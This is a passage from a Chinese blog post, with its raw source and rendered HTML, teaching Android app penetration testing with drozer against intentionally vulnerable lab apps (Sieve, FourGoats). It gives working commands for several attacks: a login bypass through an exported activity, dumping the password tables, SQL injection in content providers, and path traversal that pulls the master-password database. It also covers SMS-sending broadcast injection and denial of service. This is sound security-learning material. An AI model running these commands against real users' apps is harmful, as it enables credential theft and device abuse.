8.4、自动检测\n\n以上了解存在SQL注入和目录遍历漏洞，同样drozer提供了自动检测以上漏洞。(建议开始检测此组件前直接扫描是否存在SQL注入、目录遍历)\n\n```shell\n//自动检测SQL注入\ndz> run scanner.provider.injection -a com.mwr.example.sieve\n```\n\n![image-20200628160315252](/images/drozer/image-20200628160315252.png)\n\n```shell\n//自动检测目录遍历\ndz> run scanner.provider.traversal -a com.mwr.example.sieve\n```\n\n![image-20200628160431455](/images/drozer/image-20200628160431455.png)\n\n#### 9、Services\n\n一个 Service 是没有界面且能长时间运行于后台的应用组件，其它应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行；另外，一个组件可以绑定到一 个service来进行交互，即使这个交互是进程间通讯也没问题.例如，一个 service 可能处理网络事物，播放音乐，执行文件 I/O，或与一个内容提供者交互，所有这些都在后台进行。\n\n````shell\n//检测service\ndz> run app.service.start --action com.mwr.example.sieve.AuthService\n````\n\n#### 10、Broadcast\n\n```shell\n//检测Broadcast组件\ndz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats\n```\n\n![image-20200628163232216](/images/drozer/image-20200628163232216.png)\n\n(APK未加壳直接反编译获取指定参数)\n\n源代码参数phoneNumber和massage，会发送Your text message has been sent!\n\n![image-20200628190616482](/images/drozer/image-20200628190616482.png)\n\n```shell\n//发送恶意代码\ndz> run app.broadcast.send --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message 123\n```\n\n![image-20200628174809779](/images/drozer/image-20200628174809779.png)\n\n手机端提示信息发送成功提醒\n\n<img src=\"/images/drozer/image-20200628174909868.png\" alt=\"image-20200628174909868\" style=\"zoom:50%;\" />\n\n#### 11、Vul实战\n\n````shell\n//发送恶意数据到手机号上\ndz> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver --extra sting number 18225xxxxx\n````\n\n#### 12、拒绝服务\n\n```shell\n//拒绝服务分两种空 actoin 和空 extras\n//空action\ndz> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver\n//空extras\ndz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS\n```\n\n<img src=\"/images/drozer/image-20200628194446420.png\" alt=\"image-20200628194446420\" style=\"zoom:50%;\" />\n\n### WebView代码执行检测\n\n1、检测模版安装\n\n开启检测前需提前安装模块`checkjavascriptbridge`\n\n```shell\ndz> module install jubax.javascript\n```\n\n![image-20200628200631521](/images/drozer/image-20200628200631521.png)\n\n2、执行命令检测手机内所有APP\n\n```shell\ndz> run scanner.misc.checkjavascriptbridge\n```\n\n![image-20200628200729336](/images/drozer/image-20200628200729336.png)\n\n如果漏洞存在会提醒\n\n![image-20200628200810091](/images/drozer/image-20200628200810091.png)\n\n### 总结\n\n以上总结其实网络上也有很多，只是想总结出来后让自己能明白和了解到关于Android应用组件的检测项及涉及工具。当然Drozer这款综合型检测框架还有很多值得学习，比如写一些模块让检测更加自动化。\n\n### 参考\n\n````shell\nhttp://showmeshell.top/2018/09/28/How-to-use-drozer/\nhttps://bbs.pediy.com/thread-219107.htm\n````\n","source":"_posts/Drozer检测学习.md","raw":"---\ntitle: Drozer检测学习\ndate: 2020-06-20 22:40:04\ntags:\n - 移动应用安全\n---\nDrozer是MWR Labs开发的一款针对Android系统的综合安全测试框架。Drozer可以通过与Dalivik 虚拟机,以及其它应用程序的IPC端点以及底层操作系统的交互，避免正处于开发阶段，或者部署于你的组织的android应用程序和设备暴露出不可接受的安全风险。\n\n#### 环境配置\n\n```\nJDK\npython\nAndroid SDK\nadb\ndrozer-agent(安装至Android)\ndrozer(PC端)\nsieve.apk\nfourgoats.apk\n```\n\n#### 组件及描述\n\n![image-20200628111010674](/images/drozer/image-20200628111010674.png)\n\n<center>部分组件概述</center>\n\n### 环境部署\n\ndrozer部署\n\n[drozer(PC端)下载](https://github.com/mwrlabs/drozer/releases/)\n\n[drozer(客户端)下载](http://www.si1ent.xyz/Tools/drozer-agent-2.3.4.apk)\n\n安装参考网上.\n\n#### sieve\n\n[sieve](http://www.si1ent.xyz/Tools/sieve.apk)\n\nSieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。\n首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。\n\n#### Vul_Broadcast\n\n[Vul_Broadcast](http://www.si1ent.xyz/Tools/Vul_BroadcastReceiver.apk)\n\nVul_Broadcast是一款专门用于检测Broadcast组件安全性而设计的APP程序。\n\n#### fourgoats\n\n[fourgoats](http://www.si1ent/xyz/Tools/goatdroid.apk)\n\nfourgoats是OWASP项目内一款模拟检测Broadcast组件安全性，同时也存在WebView代码执行漏洞等。\n\n### 检测实战\n\n以下检测因部分APP内并不都存在可导出的组件信息，所以结合网络上的APK分别测试不同组件产生的危害。\n\n#### 0、连接\n\n```shell\n手机提前开启调试模式\nadb forward tcp:31415 tcp:31415\n31415\n//查看连接(如下表示连接正常)\nadb devices\nList of devices attached\n9SQ4Y9FU99999999\tdevice\n//drozer连接\ndrozer console connect\n```\n\n![image-20200628144434578](/images/drozer/image-20200628144434578.png)\n\n#### 1、包名检测\n\n```shell\ndz> run app.package.list\n```\n\n![image-20200628144457885](/images/drozer/image-20200628144457885.png)\n\n<center>部分APP</center>\n\n\n#### 2、sieve实例\n\n因Android内包名是唯一标识，所以可根据名称进行检索\n\n```shell\ndz> run app.package.list -f sieve\n```\n\n![image-20200628144824371](/images/drozer/image-20200628144824371.png)\n\n#### 3、APP信息\n\n```shell\ndz> run app.package.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n  Application Label: Sieve\n  Process Name: com.mwr.example.sieve\n  Version: 1.0\n  Data Directory: /data/data/com.mwr.example.sieve\n  APK Path: /data/app/com.mwr.example.sieve-1/base.apk\n  UID: 10104\n  GID: [1028, 1015, 3003]\n  Shared Libraries: null\n  Shared User ID: null\n  Uses Permissions:\n  - android.permission.READ_EXTERNAL_STORAGE\n  - android.permission.WRITE_EXTERNAL_STORAGE\n  - android.permission.INTERNET\n  Defines Permissions:\n  - com.mwr.example.sieve.READ_KEYS\n  - com.mwr.example.sieve.WRITE_KEYS\n```\n\n![image-20200628144936720](/images/drozer/image-20200628144936720.png)\n\n#### 4、漏洞检测\n\n```shell\ndz> run app.package.attacksurface com.mwr.example.sieve\nAttack Surface:\n  3 activities exported\n  0 broadcast receivers exported\n  2 content providers exported\n  2 services exported\n    is debuggable\n```\n\n![image-20200628145213646](/images/drozer/image-20200628145213646.png)\n\n#### 5、Activities\n\nActivities组件是Android新建APP每个功能均会存在的Activities页面；同样如果未对某些页面作限制可能导致绕过登录入口而进入某功能。\n\n```shell\ndz> run app.activity.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n  com.mwr.example.sieve.FileSelectActivity\n    Permission: null\n  com.mwr.example.sieve.MainLoginActivity\n    Permission: null\n  com.mwr.example.sieve.PWList\t//可倒出，未设置权限认证\n    Permission: null\n```\n\n![image-20200628145406392](/images/drozer/image-20200628145406392.png)\n\n#### 6、Activities攻击\n\n```shell\n//会直接绕过登录,进入密码添加.\ndz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList\n```\n\n![image-20200628145915024](/images/drozer/image-20200628145915024.png)\n\n#### 7、ContentProvider\n\nAndroid平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。\n\n\n\n```shell\ndz> run scanner.provider.finduris -a com.mwr.example.sieve\n```\n\n![image-20200628151122062](/images/drozer/image-20200628151122062.png)\n\n<center>Able to Query可查询数据</center>\n\n#### 8、ContentProvider攻击\n\n```shell\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/\n或\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical\n```\n\n![image-20200628152212737](/images/drozer/image-20200628152212737.png)\n\n<center>如上数据泄露</center>\n\n##### 8.1、SQL注入\n\nAndroid使用SQLite来存储数据，也可能造成SQL注入漏洞。\n\n```powershell\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"'\"\t\t\t//提交单引号测试(如下报错)\nunrecognized token: \"' FROM Passwords\" (code 1): , while compiling: SELECT ' FROM Passwords\n```\n\n![image-20200628152803161](/images/drozer/image-20200628152803161.png)\n\n```shell\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \"'\"\nunrecognized token: \"')\" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')\n```\n\n```shell\n列出数据库中所有表及相关结构信息\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"* FROM SQLITE_MASTER WHERE type='table';–\"\n```\n\n![image-20200628153216874](/images/drozer/image-20200628153216874.png)\n\n```shell\n查询其他表\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"* FROM Key;–\"\n```\n\n![image-20200628153439019](/images/drozer/image-20200628153439019.png)\n\n\n\n##### 8.2、目录遍历\n\n```shell\n//检测存在目录遍历\ndz> run scanner.provider.traversal -a com.mwr.example.sieve\n```\n\n![image-20200628154719291](/images/drozer/image-20200628154719291.png)\n\n\n\n##### 8.3、读取敏感信息\n\n```shell\n//读取手机内信息\nrun app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts\n```\n\n![image-20200628155031780](/images/drozer/image-20200628155031780.png)\n\n```shell\n//下载文件到本地\nrun app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ./database.db\n```\n\n![image-20200628155519778](/images/drozer/image-20200628155519778.png)\n\n```shell\n下载是sqlite文件并保存有主密码\n```\n\n![image-20200628155856692](/images/drozer/image-20200628155856692.png)\n\n\n\n##### 8.4、自动检测\n\n以上了解存在SQL注入和目录遍历漏洞，同样drozer提供了自动检测以上漏洞。(建议开始检测此组件前直接扫描是否存在SQL注入、目录遍历)\n\n```shell\n//自动检测SQL注入\ndz> run scanner.provider.injection -a com.mwr.example.sieve\n```\n\n![image-20200628160315252](/images/drozer/image-20200628160315252.png)\n\n```shell\n//自动检测目录遍历\ndz> run scanner.provider.traversal -a com.mwr.example.sieve\n```\n\n![image-20200628160431455](/images/drozer/image-20200628160431455.png)\n\n#### 9、Services\n\n一个 Service 是没有界面且能长时间运行于后台的应用组件，其它应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行；另外，一个组件可以绑定到一 个service来进行交互，即使这个交互是进程间通讯也没问题.例如，一个 service 可能处理网络事物，播放音乐，执行文件 I/O，或与一个内容提供者交互，所有这些都在后台进行。\n\n````shell\n//检测service\ndz> run app.service.start --action com.mwr.example.sieve.AuthService\n````\n\n#### 10、Broadcast\n\n```shell\n//检测Broadcast组件\ndz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats\n```\n\n![image-20200628163232216](/images/drozer/image-20200628163232216.png)\n\n(APK未加壳直接反编译获取指定参数)\n\n源代码参数phoneNumber和massage，会发送Your text message has been sent!\n\n![image-20200628190616482](/images/drozer/image-20200628190616482.png)\n\n```shell\n//发送恶意代码\ndz> run app.broadcast.send --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message 123\n```\n\n![image-20200628174809779](/images/drozer/image-20200628174809779.png)\n\n手机端提示信息发送成功提醒\n\n<img src=\"/images/drozer/image-20200628174909868.png\" alt=\"image-20200628174909868\" style=\"zoom:50%;\" />\n\n#### 11、Vul实战\n\n````shell\n//发送恶意数据到手机号上\ndz> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver --extra sting number 18225xxxxx\n````\n\n#### 12、拒绝服务\n\n```shell\n//拒绝服务分两种空 actoin 和空 extras\n//空action\ndz> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver\n//空extras\ndz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS\n```\n\n<img src=\"/images/drozer/image-20200628194446420.png\" alt=\"image-20200628194446420\" style=\"zoom:50%;\" />\n\n### WebView代码执行检测\n\n1、检测模版安装\n\n开启检测前需提前安装模块`checkjavascriptbridge`\n\n```shell\ndz> module install jubax.javascript\n```\n\n![image-20200628200631521](/images/drozer/image-20200628200631521.png)\n\n2、执行命令检测手机内所有APP\n\n```shell\ndz> run scanner.misc.checkjavascriptbridge\n```\n\n![image-20200628200729336](/images/drozer/image-20200628200729336.png)\n\n如果漏洞存在会提醒\n\n![image-20200628200810091](/images/drozer/image-20200628200810091.png)\n\n### 总结\n\n以上总结其实网络上也有很多，只是想总结出来后让自己能明白和了解到关于Android应用组件的检测项及涉及工具。当然Drozer这款综合型检测框架还有很多值得学习，比如写一些模块让检测更加自动化。\n\n### 参考\n\n````shell\nhttp://showmeshell.top/2018/09/28/How-to-use-drozer/\nhttps://bbs.pediy.com/thread-219107.htm\n````\n","slug":"Drozer检测学习","published":1,"updated":"2020-10-23T03:34:55.866Z","_id":"ckglobhdg0006b1hq12rs6k78","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Drozer是MWR Labs开发的一款针对Android系统的综合安全测试框架。Drozer可以通过与Dalivik 虚拟机,以及其它应用程序的IPC端点以及底层操作系统的交互，避免正处于开发阶段，或者部署于你的组织的android应用程序和设备暴露出不可接受的安全风险。</p>\n<h4 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JDK</span><br><span class=\"line\">python</span><br><span class=\"line\">Android SDK</span><br><span class=\"line\">adb</span><br><span class=\"line\">drozer-agent(安装至Android)</span><br><span class=\"line\">drozer(PC端)</span><br><span class=\"line\">sieve.apk</span><br><span class=\"line\">fourgoats.apk</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"组件及描述\"><a href=\"#组件及描述\" class=\"headerlink\" title=\"组件及描述\"></a>组件及描述</h4><p><img src=\"/images/drozer/image-20200628111010674.png\" alt=\"image-20200628111010674\"></p>\n<center>部分组件概述</center>\n\n<h3 id=\"环境部署\"><a href=\"#环境部署\" class=\"headerlink\" title=\"环境部署\"></a>环境部署</h3><p>drozer部署</p>\n<p><a href=\"https://github.com/mwrlabs/drozer/releases/\">drozer(PC端)下载</a></p>\n<p><a href=\"http://www.si1ent.xyz/Tools/drozer-agent-2.3.4.apk\">drozer(客户端)下载</a></p>\n<p>安装参考网上.</p>\n<h4 id=\"sieve\"><a href=\"#sieve\" class=\"headerlink\" title=\"sieve\"></a>sieve</h4><p><a href=\"http://www.si1ent.xyz/Tools/sieve.apk\">sieve</a></p>\n<p>Sieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。<br>首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。</p>\n<h4 id=\"Vul-Broadcast\"><a href=\"#Vul-Broadcast\" class=\"headerlink\" title=\"Vul_Broadcast\"></a>Vul_Broadcast</h4><p><a href=\"http://www.si1ent.xyz/Tools/Vul_BroadcastReceiver.apk\">Vul_Broadcast</a></p>\n<p>Vul_Broadcast是一款专门用于检测Broadcast组件安全性而设计的APP程序。</p>\n<h4 id=\"fourgoats\"><a href=\"#fourgoats\" class=\"headerlink\" title=\"fourgoats\"></a>fourgoats</h4><p><a href=\"http://www.si1ent/xyz/Tools/goatdroid.apk\">fourgoats</a></p>\n<p>fourgoats是OWASP项目内一款模拟检测Broadcast组件安全性，同时也存在WebView代码执行漏洞等。</p>\n<h3 id=\"检测实战\"><a href=\"#检测实战\" class=\"headerlink\" title=\"检测实战\"></a>检测实战</h3><p>以下检测因部分APP内并不都存在可导出的组件信息，所以结合网络上的APK分别测试不同组件产生的危害。</p>\n<h4 id=\"0、连接\"><a href=\"#0、连接\" class=\"headerlink\" title=\"0、连接\"></a>0、连接</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">手机提前开启调试模式</span><br><span class=\"line\">adb forward tcp:31415 tcp:31415</span><br><span class=\"line\">31415</span><br><span class=\"line\">//查看连接(如下表示连接正常)</span><br><span class=\"line\">adb devices</span><br><span class=\"line\">List of devices attached</span><br><span class=\"line\">9SQ4Y9FU99999999\tdevice</span><br><span class=\"line\">//drozer连接</span><br><span class=\"line\">drozer console connect</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144434578.png\" alt=\"image-20200628144434578\"></p>\n<h4 id=\"1、包名检测\"><a href=\"#1、包名检测\" class=\"headerlink\" title=\"1、包名检测\"></a>1、包名检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.list</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144457885.png\" alt=\"image-20200628144457885\"></p>\n<center>部分APP</center>\n\n\n<h4 id=\"2、sieve实例\"><a href=\"#2、sieve实例\" class=\"headerlink\" title=\"2、sieve实例\"></a>2、sieve实例</h4><p>因Android内包名是唯一标识，所以可根据名称进行检索</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.list -f sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144824371.png\" alt=\"image-20200628144824371\"></p>\n<h4 id=\"3、APP信息\"><a href=\"#3、APP信息\" class=\"headerlink\" title=\"3、APP信息\"></a>3、APP信息</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.info -a com.mwr.example.sieve</span></span><br><span class=\"line\">Package: com.mwr.example.sieve</span><br><span class=\"line\">  Application Label: Sieve</span><br><span class=\"line\">  Process Name: com.mwr.example.sieve</span><br><span class=\"line\">  Version: 1.0</span><br><span class=\"line\">  Data Directory: /data/data/com.mwr.example.sieve</span><br><span class=\"line\">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class=\"line\">  UID: 10104</span><br><span class=\"line\">  GID: [1028, 1015, 3003]</span><br><span class=\"line\">  Shared Libraries: null</span><br><span class=\"line\">  Shared User ID: null</span><br><span class=\"line\">  Uses Permissions:</span><br><span class=\"line\">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class=\"line\">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class=\"line\">  - android.permission.INTERNET</span><br><span class=\"line\">  Defines Permissions:</span><br><span class=\"line\">  - com.mwr.example.sieve.READ_KEYS</span><br><span class=\"line\">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144936720.png\" alt=\"image-20200628144936720\"></p>\n<h4 id=\"4、漏洞检测\"><a href=\"#4、漏洞检测\" class=\"headerlink\" title=\"4、漏洞检测\"></a>4、漏洞检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.attacksurface com.mwr.example.sieve</span></span><br><span class=\"line\">Attack Surface:</span><br><span class=\"line\">  3 activities exported</span><br><span class=\"line\">  0 broadcast receivers exported</span><br><span class=\"line\">  2 content providers exported</span><br><span class=\"line\">  2 services exported</span><br><span class=\"line\">    is debuggable</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628145213646.png\" alt=\"image-20200628145213646\"></p>\n<h4 id=\"5、Activities\"><a href=\"#5、Activities\" class=\"headerlink\" title=\"5、Activities\"></a>5、Activities</h4><p>Activities组件是Android新建APP每个功能均会存在的Activities页面；同样如果未对某些页面作限制可能导致绕过登录入口而进入某功能。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.activity.info -a com.mwr.example.sieve</span></span><br><span class=\"line\">Package: com.mwr.example.sieve</span><br><span class=\"line\">  com.mwr.example.sieve.FileSelectActivity</span><br><span class=\"line\">    Permission: null</span><br><span class=\"line\">  com.mwr.example.sieve.MainLoginActivity</span><br><span class=\"line\">    Permission: null</span><br><span class=\"line\">  com.mwr.example.sieve.PWList\t//可倒出，未设置权限认证</span><br><span class=\"line\">    Permission: null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628145406392.png\" alt=\"image-20200628145406392\"></p>\n<h4 id=\"6、Activities攻击\"><a href=\"#6、Activities攻击\" class=\"headerlink\" title=\"6、Activities攻击\"></a>6、Activities攻击</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//会直接绕过登录,进入密码添加.</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628145915024.png\" alt=\"image-20200628145915024\"></p>\n<h4 id=\"7、ContentProvider\"><a href=\"#7、ContentProvider\" class=\"headerlink\" title=\"7、ContentProvider\"></a>7、ContentProvider</h4><p>Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.finduris -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628151122062.png\" alt=\"image-20200628151122062\"></p>\n<center>Able to Query可查询数据</center>\n\n<h4 id=\"8、ContentProvider攻击\"><a href=\"#8、ContentProvider攻击\" class=\"headerlink\" title=\"8、ContentProvider攻击\"></a>8、ContentProvider攻击</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span></span><br><span class=\"line\">或</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628152212737.png\" alt=\"image-20200628152212737\"></p>\n<center>如上数据泄露</center>\n\n<h5 id=\"8-1、SQL注入\"><a href=\"#8-1、SQL注入\" class=\"headerlink\" title=\"8.1、SQL注入\"></a>8.1、SQL注入</h5><p>Android使用SQLite来存储数据，也可能造成SQL注入漏洞。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ -<span class=\"literal\">-projection</span> <span class=\"string\">&quot;&#x27;&quot;</span>\t\t\t//提交单引号测试(如下报错)</span><br><span class=\"line\">unrecognized token: <span class=\"string\">&quot;&#x27; FROM Passwords&quot;</span> (code <span class=\"number\">1</span>): , <span class=\"keyword\">while</span> compiling: <span class=\"built_in\">SELECT</span> <span class=\"string\">&#x27; FROM Passwords</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628152803161.png\" alt=\"image-20200628152803161\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span class=\"string\">&quot;&#x27;&quot;</span></span></span><br><span class=\"line\">unrecognized token: &quot;&#x27;)&quot; (code 1): , while compiling: SELECT * FROM Passwords WHERE (&#x27;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">列出数据库中所有表及相关结构信息</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class=\"string\">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;–&quot;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628153216874.png\" alt=\"image-20200628153216874\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询其他表</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class=\"string\">&quot;* FROM Key;–&quot;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628153439019.png\" alt=\"image-20200628153439019\"></p>\n<h5 id=\"8-2、目录遍历\"><a href=\"#8-2、目录遍历\" class=\"headerlink\" title=\"8.2、目录遍历\"></a>8.2、目录遍历</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//检测存在目录遍历</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.traversal -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628154719291.png\" alt=\"image-20200628154719291\"></p>\n<h5 id=\"8-3、读取敏感信息\"><a href=\"#8-3、读取敏感信息\" class=\"headerlink\" title=\"8.3、读取敏感信息\"></a>8.3、读取敏感信息</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//读取手机内信息</span><br><span class=\"line\">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628155031780.png\" alt=\"image-20200628155031780\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//下载文件到本地</span><br><span class=\"line\">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ./database.db</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628155519778.png\" alt=\"image-20200628155519778\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">下载是sqlite文件并保存有主密码</span><br></pre></td></tr></table></figure>\n\n<p><img 